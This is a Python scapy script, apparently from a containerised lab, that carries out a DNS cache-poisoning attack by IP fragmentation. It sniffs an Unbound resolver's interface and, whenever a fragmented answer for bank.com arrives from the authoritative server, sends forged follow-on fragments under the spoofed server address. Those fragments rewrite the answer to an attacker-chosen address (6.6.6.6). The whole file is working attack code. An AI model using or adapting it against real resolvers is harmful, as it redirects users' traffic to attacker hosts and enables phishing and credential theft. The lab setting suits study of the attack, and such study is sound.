#!/usr/bin/env python3
"""Sniff Unbound's eth0 and complete bank.com first-fragments with a poison tail.

Must run on the resolver: Docker bridge does not deliver auth->resolver packets
to the attacker veth.
"""
from __future__ import annotations

import os
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, fragment, send, sniff  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.80.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.80.0.100")
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")
FRAGSIZE = int(os.getenv("FRAGSIZE", "40"))
DNS_LEN = int(os.getenv("DNS_LEN", "120"))
MODE_FILE = "/app/poison_mode"


def poison_on() -> bool:
    try:
        return open(MODE_FILE, encoding="utf-8").read().strip().lower() == "on"
    except FileNotFoundError:
        return False


def qname_from_partial(dns_head: bytes) -> str | None:
    try:
        parsed = DNS(dns_head)
        if parsed.qd and parsed.qd.qname:
            qn = parsed.qd.qname
            return qn.decode() if isinstance(qn, bytes) else str(qn)
    except Exception:
        pass
    if len(dns_head) < 14:
        return None
    labels = []
    idx = 12
    while idx < len(dns_head):
        length = dns_head[idx]
        if length == 0:
            break
        if (length & 0xC0) == 0xC0:
            break
        idx += 1
        if idx + length > len(dns_head):
            return None
        labels.append(dns_head[idx : idx + length].decode("ascii", "ignore"))
        idx += length
    return ".".join(labels) + "." if labels else None


def poison_datagram(dns_id: int, qname: str, ipid: int, dport: int, dns_len: int):
    dns = DNS(
        id=dns_id,
        qr=1,
        aa=1,
        rd=0,
        qd=DNSQR(qname=qname, qtype="A"),
        an=DNSRR(rrname=qname, type="A", ttl=30, rdata=POISON_IP),
    )
    body = bytes(dns)
    if len(body) < dns_len:
        body = body + (b"\x00" * (dns_len - len(body)))
    else:
        body = body[:dns_len]
    pkt = IP(src=AUTH_IP, dst=RESOLVER_IP, id=ipid, ttl=64) / UDP(sport=53, dport=dport) / body
    return fragment(pkt, fragsize=FRAGSIZE)


def on_first_fragment(pkt) -> None:
    if not poison_on():
        return
    if IP not in pkt or UDP not in pkt:
        return
    ip = pkt[IP]
    if ip.src != AUTH_IP or ip.dst != RESOLVER_IP:
        return
    if int(ip.frag) != 0:
        return
    mf = bool(ip.flags.MF) if hasattr(ip.flags, "MF") else bool(int(ip.flags) & 0x1)
    if not mf:
        return
    udp = pkt[UDP]
    dns_head = bytes(udp.payload)
    if len(dns_head) < 12:
        return
    qname = qname_from_partial(dns_head)
    if not qname or "bank.com" not in qname.lower():
        return
    dns_id = int.from_bytes(dns_head[0:2], "big")
    dns_len = int(udp.len) - 8 if udp.len else DNS_LEN
    if dns_len < 32:
        dns_len = DNS_LEN
    frags = poison_datagram(dns_id, qname, int(ip.id), int(udp.dport), dns_len)
    if len(frags) > 1:
        send(frags[1:], verbose=0)


def main() -> None:
    open(MODE_FILE, "a", encoding="utf-8").close()
    print("[poisoner] sniffing auth first-fragments on eth0", flush=True)
    while True:
        try:
            sniff(iface="eth0", filter=f"ip src {AUTH_IP} and ip dst {RESOLVER_IP}", store=False, prn=on_first_fragment)
        except Exception as exc:
            print(f"[poisoner] sniff restart: {exc}", flush=True)
            time.sleep(0.5)


if __name__ == "__main__":
    main()
